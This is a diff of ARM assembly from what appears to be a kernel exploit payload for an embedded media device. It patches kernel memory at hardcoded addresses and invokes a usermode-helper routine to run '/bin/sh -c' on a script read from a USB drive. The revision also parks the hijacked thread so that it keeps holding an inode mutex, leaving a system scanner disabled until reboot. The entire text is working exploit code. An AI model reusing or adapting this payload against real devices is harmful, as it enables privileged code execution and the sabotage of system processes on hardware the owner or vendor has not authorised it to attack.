@@ -13,27 +13,34 @@ _start:
     ldr r1, uep_w1_lit
     str r1, [r0, #4]
     add r1, r0, #8
-    ldr r3, [pc, #-48]        @ stage0's coherent word at blob+128 (0xc001bfbc)
+    ldr r3, [pc, #-44]        @ stage0's coherent word at blob+128 (0xc001bfbc)
     blx r3
 
+    @ argv on the stack: {"/bin/sh", "-c", cmd, NULL}
     adr r0, path
-    str r0, [sp, #16]
-    adr r4, argc
-    str r4, [sp, #20]
-    adr r4, cmd
-    str r4, [sp, #24]
-    eor r4, r4, r4
-    str r4, [sp, #28]
-    add r1, sp, #16
+    adr r1, argc
+    adr r2, cmd
+    eor r3, r3, r3
+    add r4, sp, #16
+    stmia r4, {r0-r3}
+    mov r1, r4
     mov r2, #0
-    mov r3, #0
     ldr r4, umh_lit
     blx r4
-1:  b 1b
+
+    @ Park this readdir thread instead of burning a core: sleep 250 jiffies
+    @ (1 s at 250 Hz) and repeat.  It still holds p1's inode mutex, so the
+    @ scanner stays dead until reboot, but CPU time stops accumulating.
+1:  ldr r4, park_lit
+    mov r0, #250
+    blx r4
+    b 1b
+
 umh_lit: .word 0xc00389c4
 uep_lit: .word 0xc0211c70
 uep_w0_lit: .word 0xe3a00002
 uep_w1_lit: .word 0xe12fff1e
+park_lit: .word 0xc0506f44
 path: .asciz "/bin/sh"
 argc: .asciz "-c"
 cmd:  .asciz "sh</opt/media/USBDriveA2/s"
